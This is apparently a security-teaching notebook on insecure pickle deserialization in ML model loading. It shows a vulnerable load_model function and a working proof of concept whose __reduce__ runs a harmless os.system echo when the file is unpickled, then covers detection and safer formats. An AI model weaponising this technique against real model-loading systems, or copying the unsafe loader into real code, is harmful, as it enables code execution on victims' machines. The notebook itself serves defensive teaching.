# Vulnerability 1 — Insecure Pickle Deserialization

This notebook demonstrates how **loading a model with `pickle.load()`** can lead to **remote code execution (RCE)**.

This is one of the most critical and common AI code vulnerabilities:
- Used in PyTorch `.pth` files, scikit‑learn `.pkl` models, joblib dumps
- Often appears in model registries, experiment scripts, and APIs
- Easily detectable by static analysis (e.g., Bandit B301)


## 1. Vulnerable Code Pattern

This is the typical pattern seen in many ML projects:
```python
def load_model(model_path):
    with open(model_path, 'rb') as f:
        model = pickle.load(f)  # DANGER: Executes arbitrary code!
    return model
```

It **looks harmless**, passes tests, and works in dev—but if `model_path` points to a malicious file, arbitrary code can run during deserialization.


In [ ]:
import os
import pickle

print("="*70)
print("VULNERABILITY 1: INSECURE PICKLE DESERIALIZATION")
print("="*70)

def load_model(model_path):
    with open(model_path, 'rb') as f:
        model = pickle.load(f)  # DANGER
    return model

print("\n[Vulnerable Code Pattern]")
print("def load_model(model_path):\n    with open(model_path, 'rb') as f:\n        model = pickle.load(f)  # DANGER\n    return model")

## 2. Creating a Malicious Pickle

We simulate an attacker who crafts a malicious pickle file that executes a system command when loaded.


In [ ]:
class MaliciousModel:
    """Malicious class that executes code during unpickling"""
    def __reduce__(self):
        cmd = 'echo "🚨 EXPLOITED! Remote code execution via pickle deserialization"'
        return (os.system, (cmd,))

print("\n[Creating Malicious Pickle File]")
with open('malicious_model.pkl', 'wb') as f:
    pickle.dump(MaliciousModel(), f)
print("✓ Created malicious_model.pkl")

## 3. Victim Loads the Model

Now we simulate the victim calling the vulnerable `load_model` function.
This is where the exploit triggers.


In [ ]:
print("\n[Victim Loads the Model]")
print("Executing: model = load_model('malicious_model.pkl')\n")
model = load_model('malicious_model.pkl')

print("\n⚠️  VULNERABILITY EXPLOITED!")
print("Impact:")
print("  • Remote code execution with application privileges")
print("  • Can steal credentials, install backdoors, exfiltrate data")
print("  • Affects: PyTorch .pth, scikit-learn .pkl, joblib dumps")

# Cleanup
os.remove('malicious_model.pkl')

## 4. Detection & Prevention

### 🔍 Detection (Static Analysis)
- **Bandit** flags `pickle.load()` as `B301` (Medium severity)
- Semgrep can also be configured to flag unsafe deserialization

### ✅ Prevention
- Do **not** use pickle for untrusted models
- Use safer formats:
  - ONNX
  - TensorFlow SavedModel
  - PyTorch `state_dict` + SafeTensors
  - HDF5

Key idea: **This is a code vulnerability, not an algorithm issue.**
